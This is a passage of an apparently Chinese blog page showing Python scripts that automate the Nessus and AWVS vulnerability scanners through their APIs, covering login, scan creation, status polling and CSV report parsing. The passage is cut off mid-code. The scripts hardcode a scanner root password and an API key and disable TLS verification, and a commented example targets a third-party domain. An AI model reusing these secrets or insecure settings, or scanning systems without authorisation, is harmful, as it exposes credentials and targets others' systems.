class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div><div class="line">276</div><div class="line">277</div><div class="line">278</div><div class="line">279</div><div class="line">280</div><div class="line">281</div><div class="line">282</div><div class="line">283</div><div class="line">284</div><div class="line">285</div><div class="line">286</div><div class="line">287</div><div class="line">288</div><div class="line">289</div><div class="line">290</div><div class="line">291</div><div class="line">292</div><div class="line">293</div><div class="line">294</div><div class="line">295</div><div class="line">296</div><div class="line">297</div><div class="line">298</div><div class="line">299</div><div class="line">300</div><div class="line">301</div><div class="line">302</div><div class="line">303</div><div class="line">304</div><div class="line">305</div><div class="line">306</div><div class="line">307</div><div class="line">308</div><div class="line">309</div><div class="line">310</div><div class="line">311</div><div class="line">312</div><div class="line">313</div><div class="line">314</div><div class="line">315</div><div class="line">316</div><div class="line">317</div><div class="line">318</div><div class="line">319</div><div class="line">320</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"># -*- coding: utf-8 -*-</div><div class="line"># @Time    : 2017/8/21 下午4:08</div><div class="line"># @Author  : Yu BenLiu</div><div class="line"># @Site    : QVQ</div><div class="line"># @File    : nessus_api_6.py.py</div><div class="line"># @Software: PyCharm</div><div class="line">import sys</div><div class="line"># sys.path.append(&quot;..&quot;)</div><div class="line"></div><div class="line">import requests, json, csv, os, time</div><div class="line">from requests.packages.urllib3.exceptions import InsecureRequestWarning</div><div class="line"></div><div class="line">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</div><div class="line"></div><div class="line"># from core.settings import talscan_config,redis_task</div><div class="line">from host_type_check import *</div><div class="line"></div><div class="line">talscan_config = &#123;&quot;report_filters&quot;: &#123;</div><div class="line">    &quot;awvs_white_list&quot;: [&quot;orange&quot;, &quot;red&quot;, &quot;blue&quot;],  # green,blue,orange,red四种级别</div><div class="line">    &quot;nessus_white_list&quot;: [&quot;High&quot;, &quot;Medium&quot;, &quot;Low&quot;],</div><div class="line">    &quot;bug_black_list&quot;: [  # 漏洞黑名单，过滤掉一些危害等级高，但没什么卵用的洞</div><div class="line">        &quot;User credentials are sent in clear text&quot;</div><div class="line">    ]</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line">class Work(object):</div><div class="line">    def __init__(self, scan_id=&quot;&quot;, scan_uuid=&quot;&quot;,scan_target=&quot;&quot;, scan_type=&quot;&quot;, scan_args=&quot;&quot;, back_fn=None):</div><div class="line">        self.api_url = &apos;https://192.168.29.198:8834&apos;</div><div class="line">        self.username = &quot;root&quot;</div><div class="line">        self.password = &quot;ybl8651073&quot;</div><div class="line">        self.filter = talscan_config[&quot;report_filters&quot;]</div><div class="line">        self.report_save_dir = &apos;/tmp/&apos;</div><div class="line">        self.verify = False</div><div class="line">        self.token = &apos;&apos;</div><div class="line">        self.enable = True</div><div class="line">        self.scan_uuid=scan_uuid</div><div class="line">        self.scan_id = scan_id</div><div class="line">        self.target = scan_target</div><div class="line">        self.scan_type = scan_type</div><div class="line">        self.args = scan_args</div><div class="line">        self.back_fn = back_fn</div><div class="line">        self.result = &#123;&#125;</div><div class="line"></div><div class="line">    def connect(self, method, resource, data=None, params=None):</div><div class="line">        headers = &#123;&apos;X-Cookie&apos;: &apos;token=&#123;0&#125;&apos;.format(self.token), &apos;content-type&apos;: &apos;application/json&apos;&#125;</div><div class="line">        data = json.dumps(data)</div><div class="line"></div><div class="line">        try:</div><div class="line">            if method == &apos;POST&apos;:</div><div class="line">                r = requests.post(str(self.api_url + resource), data=data, headers=headers, verify=self.verify)</div><div class="line"></div><div class="line">            elif method == &apos;PUT&apos;:</div><div class="line">                r = requests.put(str(self.api_url + resource), data=data, headers=headers, verify=self.verify)</div><div class="line">            elif method == &apos;DELETE&apos;:</div><div class="line">                r = requests.delete(str(self.api_url + resource), data=data, headers=headers, verify=self.verify)</div><div class="line">            else:</div><div class="line">                r = requests.get(str(self.api_url + resource), params=params, headers=headers, verify=self.verify)</div><div class="line">        except Exception, e:</div><div class="line">            print  e</div><div class="line">            return &#123;&quot;status&quot;: 3&#125;</div><div class="line"></div><div class="line">        if r.status_code == 200:</div><div class="line">            try:</div><div class="line">                data = r.json()</div><div class="line">            except:</div><div class="line">                data = r.content</div><div class="line"></div><div class="line">            result = &#123;&quot;status&quot;: 1, &quot;data&quot;: data&#125;</div><div class="line">            return result</div><div class="line">        else:</div><div class="line">            result = &#123;&quot;status&quot;: 3&#125;</div><div class="line">            return result</div><div class="line"></div><div class="line">    def nessus_login(self):</div><div class="line">        login = &#123;&apos;username&apos;: self.username, &apos;password&apos;: self.password&#125;</div><div class="line">        data = self.connect(&apos;POST&apos;, &apos;/session&apos;, data=login)</div><div class="line">        print data</div><div class="line">        status = data[&quot;status&quot;]</div><div class="line">        print status</div><div class="line">        if status == 1:</div><div class="line">            result = &#123;&quot;status&quot;: 1, &quot;data&quot;: data[&quot;data&quot;][&apos;token&apos;]&#125;</div><div class="line">            print  result</div><div class="line">            return result</div><div class="line">        else:</div><div class="line">            result = &#123;&quot;status&quot;: 0&#125;</div><div class="line">            print result</div><div class="line">            return result</div><div class="line"></div><div class="line">    def nessus_process_status(self, sid):</div><div class="line">        # canceled,running,completed</div><div class="line">        data = self.nessus_login()</div><div class="line">        status = data[&quot;status&quot;]</div><div class="line">        if status == 1:</div><div class="line">            token = data[&quot;data&quot;]</div><div class="line">        else:</div><div class="line">            result = &#123;&quot;status&quot;: 0&#125;</div><div class="line">            return result</div><div class="line"></div><div class="line">        headers = &#123;&apos;X-Cookie&apos;: &apos;token=&#123;0&#125;&apos;.format(token), &apos;content-type&apos;: &apos;application/json&apos;&#125;</div><div class="line">        url = self.api_url + &apos;/scans/&apos;</div><div class="line">        data = requests.get(url=url, params=None, headers=headers, verify=self.verify)</div><div class="line">        res = data.json()</div><div class="line">        info1=res[&apos;scans&apos;]</div><div class="line">        print info1</div><div class="line">        try:</div><div class="line">            return  info1</div><div class="line">        except:</div><div class="line">            return &#123;&quot;status&quot;: 0&#125;</div><div class="line">    def  nessus_policies(self,):</div><div class="line">        data = self.nessus_login()</div><div class="line">        status = data[&quot;status&quot;]</div><div class="line">        if status == 1:</div><div class="line">            token = data[&quot;data&quot;]</div><div class="line">        else:</div><div class="line">            result = &#123;&quot;status&quot;: 0&#125;</div><div class="line">            return result</div><div class="line"></div><div class="line">        headers = &#123;&apos;X-Cookie&apos;: &apos;token=&#123;0&#125;&apos;.format(token), &apos;content-type&apos;: &apos;application/json&apos;&#125;</div><div class="line">        url = self.api_url + &apos;/policies/&apos;</div><div class="line">        data = requests.get(url=url, params=None, headers=headers, verify=self.verify)</div><div class="line">        res = data.json()</div><div class="line">        info=res[&apos;policies&apos;]</div><div class="line">        print info</div><div class="line">        try:</div><div class="line">            return info</div><div class="line">        except:</div><div class="line">            return &#123;&quot;status&quot;: 0&#125;</div><div class="line"></div><div class="line"></div><div class="line">    def nessus_add_task(self):</div><div class="line">        if is_domain(self.target) or is_host(self.target):</div><div class="line">            create_data = &#123;</div><div class="line">                &quot;uuid&quot;: self.scan_uuid,</div><div class="line">                # &quot;uuid&quot;: &apos;ad629e16-03b6-8c1d-cef6-ef8c9dd3c658d24bd260ef5f9e66&apos;,#选择策略</div><div class="line">                &quot;settings&quot;: &#123;</div><div class="line">                    &quot;name&quot;: self.scan_id,</div><div class="line">                    &quot;scanner_id&quot;: &quot;1&quot;,</div><div class="line">                    &quot;text_targets&quot;: self.target,</div><div class="line">                    &quot;enabled&quot;: False,</div><div class="line">                    &quot;launch_now&quot;: True,</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            post_data = json.dumps(create_data)</div><div class="line"></div><div class="line">            data = self.nessus_login()</div><div class="line">            status = data[&quot;status&quot;]</div><div class="line">            if status == 1:</div><div class="line">                token = data[&quot;data&quot;]</div><div class="line">            else:</div><div class="line">                print  &apos;99&apos;</div><div class="line">                return &#123;&quot;status&quot;: 2, &quot;data&quot;: &quot;NESSUS &gt;&gt;&gt;&gt; :登陆失败&quot;&#125;</div><div class="line"></div><div class="line">            headers = &#123;&apos;X-Cookie&apos;: &apos;token=&#123;0&#125;&apos;.format(token), &apos;content-type&apos;: &apos;application/json&apos;&#125;</div><div class="line">            r = requests.post(url=str(self.api_url + &apos;/scans&apos;), data=post_data, headers=headers, verify=self.verify)</div><div class="line"></div><div class="line">            if r.status_code == 200:</div><div class="line">                try:</div><div class="line">                    get_id = r.json()</div><div class="line">                except:</div><div class="line">                    get_id = r.content</div><div class="line"></div><div class="line">                sid = get_id[&apos;scan&apos;][&apos;id&apos;]</div><div class="line">                result = &#123;&quot;status&quot;: 1, &quot;data&quot;: sid&#125;</div><div class="line">                return result</div><div class="line">            else:</div><div class="line">                result = &#123;&quot;status&quot;: 2, &quot;data&quot;: &quot;NESSUS &gt;&gt;&gt;&gt; :增加任务失败&quot;&#125;</div><div class="line">                return result</div><div class="line">        else:</div><div class="line">            return &#123;&quot;status&quot;: 2, &quot;data&quot;: &quot;NESSUS &gt;&gt;&gt;&gt; :格式错误&quot;&#125;</div><div class="line"></div><div class="line">    def nessus_stop_task(self, sid):</div><div class="line">        data = self.nessus_login()</div><div class="line">        status = data[&quot;status&quot;]</div><div class="line">        if status == 1:</div><div class="line">            token = data[&quot;data&quot;]</div><div class="line">        else:</div><div class="line">            result = &#123;&quot;status&quot;: 0&#125;</div><div class="line">            return result</div><div class="line"></div><div class="line">        headers = &#123;&apos;X-Cookie&apos;: &apos;token=&#123;0&#125;&apos;.format(token), &apos;content-type&apos;: &apos;application/json&apos;&#125;</div><div class="line">        url = str(self.api_url + &apos;/scans/&#123;0&#125;/stop/&apos;.format(sid))</div><div class="line">        r = requests.post(url=url, params=None, headers=headers, verify=self.verify)</div><div class="line">        if r.status_code == 200:</div><div class="line">            result = &#123;&quot;status&quot;: 1&#125;</div><div class="line">            return result</div><div class="line">        else:</div><div class="line">            result = &#123;&quot;status&quot;: 0&#125;</div><div class="line">            return result</div><div class="line"></div><div class="line">    def nessus_report_task(self, taskid, sid):</div><div class="line">        bug_list = []</div><div class="line"></div><div class="line">        data = self.nessus_login()</div><div class="line">        status = data[&quot;status&quot;]</div><div class="line">        if status == 1:</div><div class="line">            token = data[&quot;data&quot;]</div><div class="line">        else:</div><div class="line">            result = &#123;&quot;status&quot;: 0&#125;</div><div class="line">            return result</div><div class="line"></div><div class="line">        headers = &#123;&apos;X-Cookie&apos;: &apos;token=&#123;0&#125;&apos;.format(token), &apos;content-type&apos;: &apos;application/json&apos;&#125;</div><div class="line">        url = str(self.api_url + &apos;/scans/&#123;0&#125;/export&apos;.format(sid))</div><div class="line">        data = json.dumps(&#123;&quot;format&quot;: &quot;csv&quot;&#125;)</div><div class="line">        r = requests.post(url=url, data=data, headers=headers, verify=self.verify)</div><div class="line">        try:</div><div class="line">            file = r.json()[&apos;token&apos;]</div><div class="line">        except:</div><div class="line">            result = &#123;&quot;status&quot;: 0&#125;</div><div class="line">            return result</div><div class="line">        down_file_url = str(self.api_url + &apos;/scans/exports/&#123;0&#125;/download&apos;.format(file))</div><div class="line">        r = requests.get(url=down_file_url, headers=headers, verify=self.verify)</div><div class="line"></div><div class="line">        csv_file = str(self.report_save_dir + &quot;&#123;0&#125;_nessus.csv&quot;.format(str(taskid)))</div><div class="line">        f = open(csv_file, &apos;wb&apos;)</div><div class="line">        data = r.content</div><div class="line">        f.write(data)</div><div class="line">        f.close()</div><div class="line"></div><div class="line">        csv_open_file = open(csv_file, &apos;rb&apos;)</div><div class="line">        csvReader = csv.reader(csv_open_file)</div><div class="line">        for row in csvReader:</div><div class="line">            parameterStr = &apos;,&apos;.join(row)</div><div class="line">            parameters = parameterStr.split(&apos;,&apos;)</div><div class="line">            PID = parameters[0]</div><div class="line">            CVE = parameters[1]</div><div class="line">            CVSS = parameters[2]</div><div class="line">            Risk = parameters[3]</div><div class="line">            Host = parameters[4]</div><div class="line">            Protocol = parameters[5]</div><div class="line">            Port = parameters[6]</div><div class="line">            Name = parameters[7]</div><div class="line">            Synopsis = parameters[8]</div><div class="line">            Description = parameters[9]</div><div class="line">            Solution = parameters[10]</div><div class="line">            See_Also = parameters[11]</div><div class="line">            Plugin_Output = parameters[12]</div><div class="line"></div><div class="line">            bug_name = str(Name)</div><div class="line">            bug_level = str(Risk)</div><div class="line">            bug_summary = str(Synopsis) + &quot;\r\n&quot; + str(Description)</div><div class="line">            bug_detail = &quot;Bug Port : &quot; + str(Port) + &quot;\r\n&quot; + &quot;CVE : &quot; + str(CVE)</div><div class="line">            bug_repair = str(Solution) + &quot;\r\n&quot; + str(Plugin_Output)</div><div class="line"></div><div class="line">            if str(Risk) in self.filter[&apos;nessus_white_list&apos;]:</div><div class="line">                bug_list.append(</div><div class="line">                    &#123;&apos;bug_name&apos;: bug_name, &apos;bug_level&apos;: bug_level, &apos;bug_summary&apos;: bug_summary, &apos;bug_detail&apos;: bug_detail,</div><div class="line">                     &apos;bug_repair&apos;: bug_repair&#125;)</div><div class="line"></div><div class="line">        csv_open_file.close()</div><div class="line">        # os.remove(csv_file)</div><div class="line"></div><div class="line">        if len(bug_list) &gt; 0:</div><div class="line">            result = &#123;&quot;status&quot;: 1, &quot;data&quot;: bug_list&#125;</div><div class="line">            return bug_list</div><div class="line">        else:</div><div class="line">            result = &#123;&quot;status&quot;: 0&#125;</div><div class="line">            return result</div><div class="line"></div><div class="line">    def run(self):</div><div class="line">        result = self.nessus_add_task()</div><div class="line">        status = result[&quot;status&quot;]</div><div class="line"></div><div class="line">        if status == 1:</div><div class="line">            nessus_id = int(result[&quot;data&quot;])</div><div class="line">            while True:</div><div class="line">                time.sleep(5)</div><div class="line">                nessus_process = self.nessus_process_status(nessus_id)</div><div class="line">                nessus_status = nessus_process[&quot;status&quot;]</div><div class="line">                if nessus_status == 1:</div><div class="line">                    nessus_process_data = nessus_process[&quot;data&quot;].encode(&quot;utf8&quot;)</div><div class="line">                    if nessus_process_data == &quot;completed&quot;:</div><div class="line">                        break</div><div class="line"></div><div class="line">            time.sleep(20)  # 推迟20秒，获取报告;nessus任务进程到100有部分延迟结束时间</div><div class="line">            nessus_report = self.nessus_report_task(self.scan_id, nessus_id)</div><div class="line">            nessus_report_status = nessus_report[&quot;status&quot;]</div><div class="line">            if nessus_report_status == 1:</div><div class="line">                nessus_report_data = nessus_report[&quot;data&quot;]</div><div class="line">                data = []</div><div class="line">                for line in nessus_report_data:</div><div class="line">                    task_result = &#123;</div><div class="line">                        &quot;scan_id&quot;: self.scan_id,</div><div class="line">                        &quot;model&quot;: &quot;nessus&quot;,</div><div class="line">                        &quot;bug_author&quot;: &quot;bing&quot;,</div><div class="line">                        &quot;bug_name&quot;: line[&quot;bug_name&quot;],</div><div class="line">                        &quot;bug_level&quot;: line[&quot;bug_level&quot;],</div><div class="line">                        &quot;bug_summary&quot;: line[&quot;bug_summary&quot;],</div><div class="line">                        &quot;bug_detail&quot;: line[&quot;bug_detail&quot;],</div><div class="line">                        &quot;bug_repair&quot;: line[&quot;bug_repair&quot;]</div><div class="line">                    &#125;</div><div class="line">                    redis_task.sadd(&quot;nessus_result&quot;, task_result)</div><div class="line">                    print task_result</div><div class="line"></div><div class="line">                # 任务最终结束</div><div class="line">                final_result = &#123;&quot;status&quot;: 1, &quot;scan_id&quot;: self.scan_id, &quot;model&quot;: &quot;nessus&quot;&#125;</div><div class="line"></div><div class="line">                redis_task.sadd(&quot;nessus_result&quot;, final_result)</div><div class="line">                print final_result</div><div class="line"></div><div class="line">            else:</div><div class="line">                # 任务最终结束</div><div class="line">                final_result = &#123;&quot;status&quot;: 1, &quot;scan_id&quot;: self.scan_id, &quot;model&quot;: &quot;nessus&quot;&#125;</div><div class="line"></div><div class="line">                redis_task.sadd(&quot;nessus_result&quot;, final_result)</div><div class="line">                print final_result</div><div class="line"></div><div class="line">        elif status == 2:</div><div class="line">            nessus_error = result[&quot;data&quot;]</div><div class="line">            final_result = &#123;&quot;status&quot;: 2, &quot;data&quot;: nessus_error, &quot;scan_id&quot;: self.scan_id, &quot;model&quot;: &quot;nessus&quot;&#125;</div><div class="line"></div><div class="line">            redis_task.sadd(&quot;nessus_result&quot;, final_result)</div><div class="line">            print final_result</div><div class="line"></div><div class="line"></div><div class="line">#t = Work(&quot;1234455&quot;,&quot;ad629e16-03b6-8c1d-cef6-ef8c9dd3c658d24bd260ef5f9e66&quot;,&quot;www.baidu.com&quot;)</div><div class="line">#s = t.nessus_report_task(5,84)</div><div class="line">#print s</div></pre></td></tr></table></figure>
-<h1 id="Awvs-最新的api"><a href="#Awvs-最新的api" class="headerlink" title=" Awvs 最新的api"></a><font color="#C71585" size="4" face="黑体"> Awvs 最新的api</font></h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"># -*- coding: utf-8 -*-</div><div class="line"># @Time    : 2017/8/22 下午3:08</div><div class="line"># @Author  : Yu BenLiu</div><div class="line"># @Site    : QVQ</div><div class="line"># @File    : awvs_api_11.py.py</div><div class="line"># @Software: PyCharm</div><div class="line"></div><div class="line">import json</div><div class="line">import requests</div><div class="line">import requests.packages.urllib3</div><div class="line"></div><div class="line">&apos;&apos;&apos;</div><div class="line">import requests.packages.urllib3.util.ssl_</div><div class="line">requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = &apos;ALL&apos;</div><div class="line">or</div><div class="line">pip install requests[security]</div><div class="line">&apos;&apos;&apos;</div><div class="line">requests.packages.urllib3.disable_warnings()</div><div class="line">tarurl = &quot;https://192.168.29.207:3443/&quot;</div><div class="line">apikey = &quot;1986ad8c0a5b3df4d7028d5f3c06e936c38438d15a1fb4f4588e034d3c3490fef&quot;</div><div class="line">headers = &#123;&quot;X-Auth&quot;: apikey, &quot;content-type&quot;: &quot;application/json&quot;&#125;</div><div class="line"></div><div class="line"></div><div class="line">def addtask(url=&apos;&apos;):</div><div class="line">    # 添加任务</div><div class="line">    data = &#123;&quot;address&quot;: url, &quot;description&quot;: url, &quot;criticality&quot;: &quot;10&quot;&#125;</div><div class="line">    try:</div><div class="line">        response = requests.post(tarurl + &quot;/api/v1/targets&quot;, data=json.dumps(data), headers=headers, timeout=30,</div><div class="line">                                 verify=False)</div><div class="line">        result = json.loads(response.content)</div><div class="line">        return result[&apos;target_id&apos;]</div><div class="line">    except Exception as e:</div><div class="line">        print(str(e))</div><div class="line">        return</div><div class="line"></div><div class="line"></div><div class="line">def startscan(url):</div><div class="line">    # 先获取全部的任务.避免重复</div><div class="line">    # 添加任务获取target_id</div><div class="line">    # 开始扫描</div><div class="line">    &apos;&apos;&apos;</div><div class="line">    11111111-1111-1111-1111-111111111112    High Risk Vulnerabilities</div><div class="line">    11111111-1111-1111-1111-111111111115    Weak Passwords</div><div class="line">    11111111-1111-1111-1111-111111111117    Crawl Only</div><div class="line">    11111111-1111-1111-1111-111111111116    Cross-site Scripting Vulnerabilities</div><div class="line">    11111111-1111-1111-1111-111111111113    SQL Injection Vulnerabilities</div><div class="line">    11111111-1111-1111-1111-111111111118    quick_profile_2 0   &#123;&quot;wvs&quot;: &#123;&quot;profile&quot;: &quot;continuous_quick&quot;&#125;&#125;</div><div class="line">    11111111-1111-1111-1111-111111111114    quick_profile_1 0   &#123;&quot;wvs&quot;: &#123;&quot;profile&quot;: &quot;continuous_full&quot;&#125;&#125;</div><div class="line">    11111111-1111-1111-1111-111111111111    Full Scan   1   &#123;&quot;wvs&quot;: &#123;&quot;profile&quot;: &quot;Default&quot;&#125;&#125;</div><div class="line">    &apos;&apos;&apos;</div><div class="line">    targets = getscan()</div><div class="line">    if url in targets:</div><div class="line">        return &quot;repeat&quot;</div><div class="line">    else:</div><div class="line">        target_id = addtask(url)</div><div class="line">        data = &#123;&quot;target_id&quot;: target_id, &quot;profile_id&quot;: &quot;11111111-1111-1111-1111-111111111111&quot;,</div><div class="line">                &quot;schedule&quot;: &#123;&quot;disable&quot;: False, &quot;start_date&quot;: None, &quot;time_sensitive&quot;: False&#125;&#125;</div><div class="line">        try:</div><div class="line">            response = requests.post(tarurl + &quot;/api/v1/scans&quot;, data=json.dumps(data), headers=headers, timeout=30,</div><div class="line">                                     verify=False)</div><div class="line">            result = json.loads(response.content)</div><div class="line">            return result[&apos;target_id&apos;]</div><div class="line">        except Exception as e:</div><div class="line">            print(str(e))</div><div class="line">            return</div><div class="line"></div><div class="line"></div><div class="line">def getstatus(scan_id):</div><div class="line">    # 获取scan_id的扫描状况</div><div class="line">    try:</div><div class="line">        response = requests.get(tarurl + &quot;/api/v1/scans/&quot; + str(scan_id), headers=headers, timeout=30, verify=False)</div><div class="line">        result = json.loads(response.content)</div><div class="line">        status = result[&apos;current_session&apos;][&apos;status&apos;]</div><div class="line">        # 如果是completed 表示结束.可以生成报告</div><div class="line">        if status == &quot;completed&quot;:</div><div class="line">            return getreports(scan_id)</div><div class="line">        else:</div><div class="line">            return result[&apos;current_session&apos;][&apos;status&apos;]</div><div class="line">    except Exception as e:</div><div class="line">        print(str(e))</div><div class="line">        return</div><div class="line"></div><div class="line"></div><div class="line">def delete_scan(scan_id):</div><div class="line">    # 删除scan_id的扫描</div><div class="line">    try:</div><div class="line">        response = requests.delete(tarurl + &quot;/api/v1/scans/&quot; + str(scan_id), headers=headers, timeout=30, verify=False)</div><div class="line">        # 如果是204 表示删除成功</div><div class="line">        if response.status_code == &quot;204&quot;:</div><div class="line">            return True</div><div class="line">        else:</div><div class="line">            return False</div><div class="line">    except Exception as e:</div><div class="line">        print(str(e))</div><div class="line">        return</div><div class="line"></div><div class="line"></div><div class="line">def delete_target(scan_id):</div><div class="line">    # 删除scan_id的扫描</div><div class="line">    try:</div><div class="line">        response = requests.delete(tarurl + &quot;/api/v1/targets/&quot; + str(scan_id), headers=headers, timeout=30,</div><div class="line">                                   verify=False)</div><div class="line">        # 如果是204 表示删除成功</div><div class="line">        if response.status_code == &quot;204&quot;:</div><div class="line">            return True</div><div class="line">        else:</div><div class="line">            return False</div><div class="line">    except Exception as e:</div><div class="line">        print(str(e))</div><div class="line">        return</div><div class="line"></div><div class="line"></div><div class="line">def stop_scan(scan_id):</div><div class="line">    # 停止scan_id的扫描</div><div class="line">    try:</div><div class="line">        response = requests.post(tarurl + &quot;/api/v1/scans/&quot; + str(scan_id + &quot;/abort&quot;), headers=headers, timeout=30,</div><div class="line">                                 verify=False)</div><div class="line">        # 如果是204 表示停止成功</div><div class="line">        if response.status_code == &quot;204&quot;:</div><div class="line">            return True</div><div class="line">        else:</div><div class="line">            return False</div><div class="line">    except Exception as e:</div><div class="line">        print(str(e))</div><div class="line">        return</div><div class="line">def scan_status():</div><div class="line">    # 停止scan_id的扫描</div><div class="line">    try:</div><div class="line">        response = requests.get(tarurl + &quot;/api/v1/me/stats&quot;, headers=headers, timeout=30, verify=False)</div><div class="line">        result = json.loads(response.content)</div><div class="line">        print result</div><div class="line">        return result</div><div class="line">    except Exception as e:</div><div class="line">        print(str(e))</div><div class="line">        return</div><div class="line"></div><div class="line"></div><div class="line">def getreports(scan_id):</div><div class="line">    # 获取scan_id的扫描报告</div><div class="line">    &apos;&apos;&apos;</div><div class="line">    